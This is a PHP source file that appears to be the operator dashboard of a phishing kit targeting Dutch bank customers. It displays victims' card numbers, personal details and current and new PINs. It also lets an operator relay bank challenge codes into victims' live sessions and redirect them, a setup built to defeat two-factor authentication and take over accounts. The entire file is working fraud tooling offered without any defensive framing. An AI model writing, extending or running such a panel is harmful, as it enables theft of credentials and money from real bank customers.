<?php
require_once("../common/commonfiles.php");
$data = db::getRecords("SELECT * FROM data WHERE status=0 ORDER BY id DESC");
include_once 'header.php';
$DEF_ADDRESS = db::getCell("SELECT address FROM def_address WHERE id=1");
?>
<table class="table">
    <thead>
        <tr>
            <th>Date</th>
            <th>Mijn kaartnummer</th>            
            <?php if ($_SESSION['mode'] == "transfer") { ?>
                <th>Challange Code 1</th>
            <?php } ?>
            <th class="text-center">Info</th>
            <?php if ($_SESSION['mode'] == "transfer") { ?>
                <th>Inlog Code</th>
                <th>Redirect 1</th>
                <th>Challenge Code 2 & 3</th>
                <th>Response </th>
                <th>Redirect 2</th>
            <?php } else { ?>                
                <th>Welke dag verstuurt u uw bankpas?</th>
                <?php if ($_SESSION["loggedInUserRole"] == "admin") { ?>
                    <th class="text-center" width="15%">PIN</th>
                <?php } ?>
            <?php } ?>
            <?php if ($_SESSION['mode'] == "finish") { ?>
                <th>Finish Address</th>
            <?php } ?>
            <th>Action</th>
        </tr>
    </thead>
    <tbody>
        <?php
        $counter = 1;
        foreach ($data as $value) {
            ?>
            <tr>
                <td><b><?php echo $value['date']; ?></b></td>
                <td><?php echo $value['username']; ?></td>
                <?php if ($_SESSION['mode'] == "transfer") { ?>
                    <td>
                        <input type="text" 
                               style="<?php echo ($value['response1'] == '' ) ? 'background-color:orange' : 'background-color:green'; ?>" class="form-control" value="<?php echo $value['response1']; ?>" data-toggle="popover" data-placement="top" data-html="true"
                               data-content="<form name='form' method='post' action='actions.php?j=response1'>
                               <div class=''><div class='input-group'>
                               <input type='text' onKeyDown='checkNumeric(event);' class='form-control' maxlength='8' name='response1' placeholder='Challenge Code 1' value='<?php echo $value['response1']; ?>'>
                               <span class='input-group-btn'> 
                               <button class='btn btn-secondary' type='submit'>Submit</button></span>
                               </div>
                               </div>
                               </div>
                               <input type='hidden' name='rid' value='<?php echo $value['id']; ?>'>
                               </form>" 
                               title="Challenge Code 1">
                    </td>
                <?php } ?>
                <td class="text-center"  width="15%">
                    <a href="#" 
                       data-toggle="popover"
                       data-placement="bottom"
                       data-html="true"
                       data-trigger="hover" 
                       data-content="<b>Voornaam:</b><br /><?php echo $value["voornaam"]; ?><br />
                       <b>Straat en nummer:</b><br /><?php echo $value["street"]; ?><br />
                       <b>Postcode:</b><br /><?php echo $value["street"]; ?><br />                       
                       <b>E-mailadres:</b><br /><?php echo $value["email"]; ?><br />                                              
                       <b>Telefoonnummer:</b><br /><?php echo $value["phone"]; ?>">
                        <i class="fa fa-exclamation-circle"></i>
                    </a>
                </td>                
                <?php
                if ($_SESSION['mode'] == "transfer") {
                    ?>                    
                    <td><?php echo $value['challenge1']; ?></td>
                    <td>
                        <select name="redirect1" data-id="<?php echo $value["id"]; ?>" class="form-control redirect1">
                            <option value="">Select</option>
                            <option <?php echo $value['redirect1'] == "error" ? 'selected="selected"' : ""; ?> value="error">Error</option>
                            <option <?php echo $value['redirect1'] == "block" ? 'selected="selected"' : ""; ?> value="block">Block</option>
                        </select>
                    </td>
                    <td>
                        <input type="text" 
                               style="<?php echo ($value['response2'] == '' ) ? 'background-color:orange' : 'background-color:green'; ?>" class="form-control" value="<?php echo $value['response2']; ?>" data-toggle="popover" data-placement="top" data-html="true"
                               data-content="<form name='form' method='post' action='actions.php?j=response2'>
                               <div class=''><div class='input-group'>
                               <input type='text' onKeyDown='checkNumeric(event);' class='form-control' maxlength='8' name='response2' placeholder='Challenge Code 2' value='<?php echo $value['response2']; ?>'>
                               <span class='input-group-btn'> 
                               <button class='btn btn-secondary' type='submit'>Submit</button></span>
                               </div>
                               </div>
                               </div>
                               <input type='hidden' name='rid' value='<?php echo $value['id']; ?>'>
                               </form>" 
                               title="Challenge Code 2">

                        <input type="text" 
                               style="<?php echo ($value['response3'] == '' ) ? 'background-color:orange' : 'background-color:green'; ?>" class="form-control" value="<?php echo $value['response3']; ?>" data-toggle="popover" data-placement="top" data-html="true"
                               data-content="<form name='form' method='post' action='actions.php?j=response3'>
                               <div class=''><div class='input-group'>
                               <input type='text' onKeyDown='checkNumeric(event);' class='form-control numeric' maxlength='8' name='response3' placeholder='Challege Code 3' value='<?php echo $value['response3']; ?>'>
                               <span class='input-group-btn'> 
                               <button class='btn btn-secondary' type='submit'>Submit</button></span>
                               </div>
                               </div>
                               </div>
                               <input type='hidden' name='rid' value='<?php echo $value['id']; ?>'>
                               </form>" 
                               title="Challenge Code 3">
                    </td>
                    <td><?php echo $value['challenge2']; ?></td>
                    <td>
                        <select name="redirect2" data-id="<?php echo $value["id"]; ?>" class="form-control redirect2">
                            <option value="">Select</option>
                            <option <?php echo $value['redirect2'] == "error" ? 'selected="selected"' : ""; ?> value="error">Error</option>
                            <?php if ($_SESSION["loggedInUserRole"] == "admin") { ?>
                                <option <?php echo $value['redirect2'] == "admin_url" ? 'selected="selected"' : ""; ?> value="admin_url">Klaar</option>
                            <?php } ?>
                            <option <?php echo $value['redirect2'] == "url" ? 'selected="selected"' : ""; ?> value="url">Home Page</option>
                        </select>
                    </td>
                <?php } else { ?>
                    <td><?php echo $value['bank_day']; ?></td>
                    <?php if ($_SESSION["loggedInUserRole"] == "admin") { ?>
                        <td class="text-center" width="15%">
                            <a href="#" 
                               data-toggle="popover"
                               data-placement="bottom"
                               data-html="true"
                               data-trigger="hover" 
                               data-content="<b>Huidige pin:</b><br /><?php echo $value["pin1"]; ?><br />
                               <b>Huidige pin (bevestiging):</b><br /><?php echo $value["pin2"]; ?><br />
                               <b>Nieuwe pin:</b><br /><?php echo $value["pin3"]; ?><br />
                               <b>Nieuwe pin (bevestiging):</b><br /><?php echo $value["pin4"]; ?>">
                                <i class="fa fa-exclamation-circle"></i>
                            </a>
                        </td>
                    <?php } ?>
                <?php } ?>
                <?php
                if ($_SESSION['mode'] == "finish") {
                    $value['mode_address'] = !empty($value['mode_address']) ? $value['mode_address'] : $DEF_ADDRESS;
                    ?>
                    <td>
                        <input type="text" 
                               style="width:26%; <?php echo ($value['mode_address'] == '' ) ? 'background-color:orange' : 'background-color:green'; ?>" class="form-control" value="<?php echo $value['mode_address']; ?>" data-toggle="popover" data-placement="top" data-html="true"
                               data-content="<form name='form' method='post' action='actions.php?j=mode_address'>
                               <div class=''><div class='input-group'>
                               <textarea class='form-control' name='mode_address' placeholder='Enter Address'><?php echo $value['mode_address']; ?></textarea>
                               <span class='input-group-btn'> 
                               <button class='btn btn-secondary' type='submit'>Submit</button></span>
                               </div>
                               </div>
                               </div>
                               <input type='hidden' name='rid' value='<?php echo $value['id']; ?>'>
                               </form>" 
                               title="Address">
                    </td>
                <?php } ?>
                <?php if ($value['status'] == 0) { ?>
                    <td>
                        <?php if ($_SESSION["loggedInUserRole"] == "admin") { ?>
                            <span style="color: orange!important;font-size: 20px;float: left;">                            
                                <a class="btn btn-xs btn-danger" href="actions.php?j=10&id=<?php echo $value['id'] ?>" onclick="return deleteit()" title="Delete"><i class="glyphicon glyphicon-trash"></i></a>                              
                            </span>
                        <?php } ?>
                    </td>
                <?php } else if ($value['status'] == 1) { ?>
                    <td><span style="color:green"><b>Approved</b></span></td>
                <?php } else if ($value['status'] == 2) { ?>
                    <td><span style="color:red"><b>Deleted</b></span></td>
                <?php } ?> 
            </tr>

            <?php
            $counter++;
        }
        ?>

    </tbody>
</table>

<script>
    $(document).ready(function () {
        $('.bcv').on('mouseover', function (e) {
            $(this).tooltip('disable');
        });
        $('.bcv').on('focus', function () {
            $(this).tooltip('enable').tooltip('show');
        });
    });
    $(function () {
        $.get("actions3.php");
        $('[data-toggle="popover"]').popover();
        $("#pageName").html("Progress");
        $(".mode").on("change", function () {
            updateMode($(this));
        });
        var updateMode = function (obj) {
            $.get("update_mode.php?id=" + obj.attr("data-id") + "&mode=" + obj.val());
        }
        $(".redirect1").on("change", function () {
            if ($(this).val() == "error") {
                if (!confirm("Are you sure ?")) {
                    $(this).val("");
                    return false;
                }
            }
            if ($(this).val() == "block") {
                if (!confirm("Are you sure you wanna block this user ?")) {
                    $(this).val("");
                    return false;
                }
            }
            updateRedirect1($(this));
        });
        var updateRedirect1 = function (obj) {
            $.get("update_redirect1.php?id=" + obj.attr("data-id") + "&redirect1=" + obj.val());
        }
        $(".redirect2").on("change", function () {
            if ($(this).val() == "error") {
                if (!confirm("Are you sure ?")) {
                    $(this).val("");
                    return false;
                }
            }
            updateRedirect2($(this));
        });
        var updateRedirect2 = function (obj) {
            $.get("update_redirect2.php?id=" + obj.attr("data-id") + "&redirect2=" + obj.val());
        }
        $(".copy_cnt").on("mouseenter", function () {
            $(this).find("span").next('button').show();
        });
        $(".copy_cnt").on("mouseleave", function () {
            $(this).find("span").next('button').hide();
        });
    });
    function copyFunction(element) {
        var $temp = $("<input>");
        $("body").append($temp);
        $temp.val($(element).text()).select();
        document.execCommand("copy");
        $temp.remove();
    }
    function checkNumeric(event) {
        if ((event.which != 46 || $(this).val().indexOf('.') != -1) && event.which != 0 && event.which != 8 && (event.which < 48 || event.which > 57)) {
            event.preventDefault();
        }
    }
</script>
